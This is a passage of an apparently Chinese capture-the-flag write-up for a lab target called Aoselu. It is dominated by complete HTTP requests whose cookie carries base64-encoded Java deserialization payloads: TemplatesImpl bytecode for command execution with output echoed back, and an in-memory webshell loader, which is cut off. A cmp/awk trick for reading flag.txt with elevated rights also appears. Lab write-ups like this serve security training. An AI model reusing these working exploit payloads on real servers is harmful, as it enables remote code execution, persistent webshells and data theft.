1N0cmluZwEAB29zLm5hbWUHAK0MAK4ArwwAsACxAQADV0lODACyALMBAAIvYwEABy9iaW4vc2gBAAItYwcAtAwAtQC2DABqALcHALgMALkAugwAQQC7AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAvAwAvQC+DAC/AMABADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAMEMAMIAwwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDADEAMUBABBqYXZhL2xhbmcvT2JqZWN0BwClDADGAMcBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgwAyADFDADJAMoBAAlhZGRIZWFkZXIMAMsAzAwAQAA9AQAGaGVhZGVyAQAEYm9keQwAPAA9AQACXEEMAM0AzgwAzwCxAQAHcHJpbnRsbgEABWZsdXNoAQAFY2xvc2UBAARFdGFnAQACbHMBAARleGVjAQAEYm9keQwASABCAQAIU0ptU0p4a0gBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAhoYXNoQ29kZQEAAygpSQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDQDABBAEIKANEA0gAhADsA0QAAAAQACAA8AD0AAAAIAD4APQAAAAgAPwA9AAAACABAAD0AAAAEAAEAQQBCAAEAQwAAAC8AAQABAAAABSq3ANOxAAAAAgBEAAAABgABAAAABgBFAAAADAABAAAABQBGAEcAAAAJAEgAQgABAEMAAAFIAAQAAwAAALyyAAJLAjwqtgADqwAAAAAzAAAAAgAvaiUAAAAaAC+<span class="number">4</span>kQAAACgqEgS2AAWZABMDPKcADioSBrYABZkABQQ8G6sAAAAAeQAAAAIAAAAAAAAAGgAAAAEAAAAquwAHWbIACLcACbgACqcAUrIACLYAC5oASQa9AAxNEg24AA62AA8SELYAEZkAECwDEhJTLAQSE1OnAA0sAxIUUywEEhVTLAWyAAhTuwAHWbgAFiy2ABe2ABi3ABm4AAqnAARLsQABAAAAtwC6ABoAAwBEAAAAPgAPAAAAEgBYABQAZQAVAGgAFwBxABgAdgAZAIYAGgCLABsAkwAdAJgAHgCdACAAowAhALcAJgC6ACUAuwAnAEUAAAAMAAEAdgBBAEkASgACAEsAAAAcAAr9ACQHAEwBDQoaD/wAKgcATQn4ABlCBwBOAAAKAE8AUAACAEMAAAJNAAcACgAAAWe4ABu2ABwSHbYAHkwrEh8DvQAgtgAhTSwBA70AIrYAI064ABu2ABwSJLYAHkwrEiUDvQAgtgAhTSwtA70AIrYAIzoEuAAbtgAcEia2AB4SJwO9ACC2ACg6BRkEtgApEioFvQAgWQMSDFNZBBIMU7YAKDoGGQYEtgArGQUEtgArGQUZBAO9ACK2ACM6B7IALDoIAjYJGQi2AAOrAAAAAAA4AAAAArc04o0AAAAbAC45ogAAACsZCBIttgAFmQAWAzYJpwAQGQgSLrYABZkABgQ2CRUJqwAAAJMAAAACAAAAAAAAABkAAAABAAAAOhkGGQQFvQAiWQOyAC9TWQQqEjC2ADG2ADJTtgAjV6cAXBkHtgApEjMEvQAgWQMSDFO2ACgZBwS9ACJZAyoSMLYAMbYAMlO2ACNXGQe2ACkSNAO9ACC2ACgZBwO9ACK2ACNXGQe2ACkSNQO9ACC2ACgZBwO9ACK2ACNXsQAAAAMARAAAAEoAEgAAACkADAAqABcAKwAhACwALQAtADgALgBDAC8AWQAwAHMAMQB5ADIAfwAzAIwANQDsADcBCgA4AQ0AOgE2ADsBTgA8AWYAPwBFAAAAUgAIAAABZwBRAFIAAAAMAVsAUwBUAAEAFwFQAFUAVgACACEBRgBXAFgAAwBDASQAWQBYAAQAWQEOAFoAVgAFAHMA9ABbAFYABgCMANsAXABYAAcASwAAACwABv8AtAAKBwBdBwBeBwBfBwBgBwBgBwBfBwBfBwBgBwBMAQAADwwaIPkAWABhAAAABAABABoACABiAEIAAQBDAAAARAABAAAAAAAYEjazAC8SN7MACBI4swACEjmzACy4ADqxAAAAAQBEAAAAGgAGAAAABwAFAAgACgAJAA8ACgAUAAwAFwANAAEAYwAAAAIAZHVxAH4AGAAAAPLK/rq+AAAAMQATAQADRm9vBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAhGb28uamF2YQEAFGphdmEvaW8vU2VyaWFsaXphYmxlBwAHAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAGPGluaXQ+AQADKClWDAAOAA8KAAQAEAEABENvZGUAIQACAAQAAQAIAAEAGgAJAAoAAQANAAAAAgALAAEAAQAOAA8AAQASAAAAEQABAAEAAAAFKrcAEbEAAAAAAAEABQAAAAIABnB0AALBkHB3AQB4dwQAAAABeA==</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/6.png"></p><p>如果不知道用哪个命令提权可以尝试问ai</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/7.png"></p><p>这里我们直接使用这个命令读取就好了</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/cmp <span class="literal">-l</span> ./flag.txt /dev/zero | awk <span class="string">&#x27;&#123;printf &quot;%c&quot;, strtonum(&quot;0&quot;$2)&#125;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=<span class="number">8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAFbBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaLBocGnwK7BlMGywaXBpcGCwaHBp5SVecHY59tsAwAAeHBzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaR0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwYPBr8GtwbDBocGywaHBtMGvwbLAu0wAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAAXNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAA3lyv66vgAAADQA1AoAIgBlCQA7AGYKAAwAZwgAaAoADABpCABqBwBrCQA7AGwKAAcAbQoAOwBuCgAMAG8HAHAIAHEKAHIAcwoADAB0CAB1CgAMAHYIAD4IAHcIAHgIAHkKAHoAewoAegB8CgB9AH4KAAcAfwcAgAoAgQCCCgCBAIMIAIQKAIUAhggAhwcAiAoAIACJBwCKCgCLAIwIAI0IAI4IAI8IAJAKACAAkQoAIgCSCACTCgCLAJQJADsAlQgAlggAlwkAOwCYCACZCgAHAJoKAAcAmwgAnAgAnQgAnggAnwgAoAgAoQgAogoAOwCjBwCkAQAJaGVhZGVyS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQAGYWN0aW9uAQAIcG9zaXRpb24BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExwYXlsb2FkL1NwcmluZ0VjaG87AQAFc3RhcnQBAAV2YXIxMQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBwBwBKBwCAAQAERWNobwEAFihMamF2YS91dGlsL1NjYW5uZXI7KVYBAAdzY2FubmVyAQATTGphdmEvdXRpbC9TY2FubmVyOwEABHZhcjABABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjEBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABHZhcjIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI0AQAEdmFyNgEABHZhcjcBAAR2YXI4BwBrBwCIBwClBwCKAQAKRXhjZXB0aW9ucwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAQQBCDAA/AD0MAKYApwEABGVjaG8MAKgAqQEABGV4ZWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPgA9DABBAKoMAE8AUAwAqwCsAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHAK0MAK4ArwwAsACxAQADV0lODACyALMBAAIvYwEABy9iaW4vc2gBAAItYwcAtAwAtQC2DABqALcHALgMALkAugwAQQC7AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAvAwAvQC+DAC/AMABADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAMEMAMIAwwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDADEAMUBABBqYXZhL2xhbmcvT2JqZWN0BwClDADGAMcBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgwAyADFDADJAMoBAAlhZGRIZWFkZXIMAMsAzAwAQAA9AQAGaGVhZGVyAQAEYm9keQwAPAA9AQACXEEMAM0AzgwAzwCxAQAHcHJpbnRsbgEABWZsdXNoAQAFY2xvc2UBAARFdGFnAQBLL3Vzci9iaW4vY21wIC1sIC4vZmxhZy50eHQgL2Rldi96ZXJvIHwgYXdrICd7cHJpbnRmICIlYyIsIHN0cnRvbnVtKCIwIiQyKX0nAQAEZXhlYwEABGJvZHkMAEgAQgEACFNKbVNKeGtIAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAIaGFzaENvZGUBAAMoKUkBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdpc0VtcHR5AQADKClaAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA0AwAQQBCCgDRANIAIQA7ANEAAAAEAAgAPAA9AAAACAA+AD0AAAAIAD8APQAAAAgAQAA9AAAABAABAEEAQgABAEMAAAAvAAEAAQAAAAUqtwDTsQAAAAIARAAAAAYAAQAAAAYARQAAAAwAAQAAAAUARgBHAAAACQBIAEIAAQBDAAABSAAEAAMAAAC8sgACSwI8KrYAA6sAAAAAMwAAAAIAL2olAAAAGgAvuJEAAAAoKhIEtgAFmQATAzynAA4qEga2AAWZAAUEPBurAAAAAHkAAAACAAAAAAAAABoAAAABAAAAKrsAB1myAAi3AAm4AAqnAFKyAAi2AAuaAEkGvQAMTRINuAAOtgAPEhC2ABGZABAsAxISUywEEhNTpwANLAMSFFMsBBIVUywFsgAIU7sAB1m4ABYstgAXtgAYtwAZuAAKpwAES7EAAQAAALcAugAaAAMARAAAAD4ADwAAABIAWAAUAGUAFQBoABcAcQAYAHYAGQCGABoAiwAbAJMAHQCYAB4AnQAgAKMAIQC3ACYAugAlALsAJwBFAAAADAABAHYAQQBJAEoAAgBLAAAAHAAK/QAkBwBMAQ0KGg/<span class="number">8</span>ACoHAE0J+AAZQgcATgAACgBPAFAAAgBDAAACTQAHAAoAAAFnuAAbtgAcEh22AB5MKxIfA70AILYAIU0sAQO9ACK2ACNOuAAbtgAcEiS2AB5MKxIlA70AILYAIU0sLQO9ACK2ACM6BLgAG7YAHBImtgAeEicDvQAgtgAoOgUZBLYAKRIqBb0AIFkDEgxTWQQSDFO2ACg6BhkGBLYAKxkFBLYAKxkFGQQDvQAitgAjOgeyACw6CAI2CRkItgADqwAAAAAAOAAAAAK3NOKNAAAAGwAuOaIAAAArGQgSLbYABZkAFgM2CacAEBkIEi62AAWZAAYENgkVCasAAACTAAAAAgAAAAAAAAAZAAAAAQAAADoZBhkEBb0AIlkDsgAvU1kEKhIwtgAxtgAyU7YAI1enAFwZB7YAKRIzBL0AIFkDEgxTtgAoGQcEvQAiWQMqEjC2ADG2ADJTtgAjVxkHtgApEjQDvQAgtgAoGQcDvQAitgAjVxkHtgApEjUDvQAgtgAoGQcDvQAitgAjV7EAAAADAEQAAABKABIAAAApAAwAKgAXACsAIQAsAC0ALQA4AC4AQwAvAFkAMABzADEAeQAyAH8AMwCMADUA7AA3AQoAOAENADoBNgA7AU4APAFmAD8ARQAAAFIACAAAAWcAUQBSAAAADAFbAFMAVAABABcBUABVAFYAAgAhAUYAVwBYAAMAQwEkAFkAWAAEAFkBDgBaAFYABQBzAPQAWwBWAAYAjADbAFwAWAAHAEsAAAAsAAb/ALQACgcAXQcAXgcAXwcAYAcAYAcAXwcAXwcAYAcATAEAAA8MGiD5AFgAYQAAAAQAAQAaAAgAYgBCAAEAQwAAAEQAAQAAAAAAGBI2swAvEjezAAgSOLMAAhI5swAsuAA6sQAAAAEARAAAABoABgAAAAcABQAIAAoACQAPAAoAFAAMABcADQABAGMAAAACAGR1cQB+ABgAAADyyv66vgAAADEAEwEAA0ZvbwcAAQEAEGphdmEvbGFuZy9PYmplY3QHAAMBAApTb3VyY2VGaWxlAQAIRm9vLmphdmEBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQcABwEAEHNlcmlhbFZlcnNpb25VSUQBAAFKBXHmae48bUcYAQANQ29uc3RhbnRWYWx1ZQEABjxpbml0PgEAAygpVgwADgAPCgAEABABAARDb2RlACEAAgAEAAEACAABABoACQAKAAEADQAAAAIACwABAAEADgAPAAEAEgAAABEAAQABAAAABSq3ABGxAAAAAAABAAUAAAACAAZwdAACwZBwdwEAeHcEAAAAAXg=</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/8.png"></p><p>拿到flag</p><h4 id="不出网打内存马"><a href="#不出网打内存马" class="headerlink" title="不出网打内存马"></a>不出网打内存马</h4><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/9.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/10.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.99</span>.<span class="number">157.159</span>:<span class="number">8080</span></span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAC7BqsGhwbbBocCuwbXBtMGpwazArsGQwbLBqcGvwbLBqcG0wbnBkcG1waXBtcGllNowtPs/grEDAAJJAAjBs8GpwbrBpUwAFMGjwa/BrcGwwaHBssGhwbTBr8GydAAswYzBqsGhwbbBocCvwbXBtMGpwazAr8GDwa/BrcGwwaHBssGhwbTBr8GywLt4cAAAAAJzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaRxAH4AAUwAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAA3NyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAD07yv66vgAAADQAaAoAFAA0CAA1CgAFADYIAB4HADcHACEKAAUAOAoAOQA6CgA7ADwIAD0KAD4APwoABQBACgBBADoHAEIKAEMARAoAQQBFCgA5AEYKAAUARwcASAcASQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAhTHBheWxvYWQvVGVtcGxhdGVJbXBsQ2xhc3NMb2FkZXI7AQAGbG9hZGVyAQARTGphdmEvbGFuZy9DbGFzczsBAAtkZWZpbmVDbGFzcwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAEY29kZQEAAltCAQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAKRXhjZXB0aW9ucwcASgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGF